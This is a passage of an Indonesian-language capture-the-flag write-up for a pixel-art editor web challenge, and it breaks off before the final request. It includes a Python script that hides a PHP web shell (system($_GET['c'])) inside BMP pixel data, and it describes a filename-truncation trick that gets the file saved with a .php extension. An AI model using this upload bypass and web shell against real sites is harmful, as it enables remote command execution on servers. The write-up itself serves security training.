## Problem
---

```
Create your own pixel art with this powerful tool.
```

## Writeup
---

Kita diberikan website yang fungsinya bisa untuk nge-warnain per-pixel dan
dikirim ke php dalam bentuk array RGB 32*32 (4096), ketika kita coba untuk mengurangi/menambahkan 
pixel maka akan muncul error `Error : </b>bad pixel art size (must be 32*32*(RGBA), got : 4097)`

![Error](../images/pixeditor.PNG)

ada 3 parameter yang dikirim ke `/save.php` yaitu `data=[RGB]&name=[file.ext]&format=[JPG|GIF|BMP|PNG]`
pada parameter data kita bisa mengatur data yang akan menjadi konten dari file, nah bagaimana caranya
agar kita bisa mengirimkan script php dalam bentuk array rgb. dan dari keempat format tersebut 
kita bisa menggunakan format bmp karena tidak ada compression atau informasi yang di kurangkan CMIIW.

```python

payloadd = []

w = "p?<" # php
w += "X p"
w += "hys" 
w += "yss" 
w += "met"
w += "d_$"
w += "(hT"
w += "EGl"
w += "c'["
w += "')]"
w += "'b>"
w += "?;F"
w += "GHI"
w += "JKL"
w += "MNO"

for x in w:
	payloadd.append(ord(x))

payloadd += [0]*(4096-len(payloadd))
print payloadd
```

kemudian saya membuat script python untuk membuat payload dalam bentuk rgb 32*32,
menggunakan payload di atas kita bisa mendapatkan file `.bmp` dengan 
backdoor php didalamnya `<?php system($_GET['c']); ?>` tapi kita tidak bisa
mengeksekusi php pada format file .bmp, karena menggunakan nullbyte(%00) tidak
berhasil karena php yang digunakan adalah versi 7, ternyata ada komentar yang menarik
pada file javascript http://pixeditor.challs.malice.fr/js/pixeditor.js 
`inputName.maxLength = 45; // 50 - Len(Extension) - Filename will be truncated if len > 50`
jika input kita lebih dari 50 maka akan di truncate

```python
python -c 'print "a"*46+".php.bmp"'
# aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.php.bmp
```

our final request look like this

```
